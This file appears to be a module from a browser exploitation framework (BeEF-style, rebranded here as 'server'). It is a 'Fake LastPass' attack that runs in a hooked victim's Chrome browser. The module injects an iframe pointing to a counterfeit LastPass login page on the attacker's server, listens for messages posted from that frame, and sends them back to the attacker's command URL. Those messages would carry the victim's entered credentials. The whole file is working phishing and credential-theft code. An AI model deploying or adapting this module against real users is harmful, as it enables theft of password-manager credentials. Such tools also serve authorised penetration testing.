//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {

	// Prepare the onmessage event handling
	var eventMethod = window.addEventListener ? "addEventListener" : "attachEvent";
	var eventer = window[eventMethod];
	var messageEvent = eventMethod == "attachEvent" ? "onmessage" : "message";
	eventer(messageEvent,function(e) {
		if (e.data == "KILLFRAME") {
			server.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Killing Frame');	
			server.net.send('<%= @command_url %>', <%= @command_id %>, 'meta=KILLFRAME');	
			server.dom.removeElement('LPIFRAME');
			return;
		} else {
			server.net.send('<%= @command_url %>', <%= @command_id %>, 'result=' + e.data);	
		}
	},false);	

	if (server.browser.isC()) {
		server.dom.createIframe('custom', {'src':server.net.httpproto+'://'+server.net.host+':'+server.net.port+'/lp/index.html','id':'LPIFRAME'}, {'width':'294px','height':'352px','position':'fixed','right':'5px','top':'0px','z-index':server.dom.getHighestZindex()+1,'border':'1px solid white','overflow':'hidden'}); 
		server.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Chrome IFrame Created .. awaiting messages');	
	} else {
		server.debug('[Fake LastPass] Unspported browser');
		server.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=No IFrame Created -- browser is not Chrome', server.are.status_error());
	}

	// $j('body').append("<div id='lp_login_dia' style='width:375px; height:415px; position: fixed; right: 0px; top: 0px; z-index: "+server.dom.getHighestZindex()+1+"; border: 1px solid white; overflow: hidden; display: none'></div>");

	// $j('#lp_login_dia').load(server.net.httpproto+"://"+server.net.host+":"+server.net.port+"/lp/index.html");



});
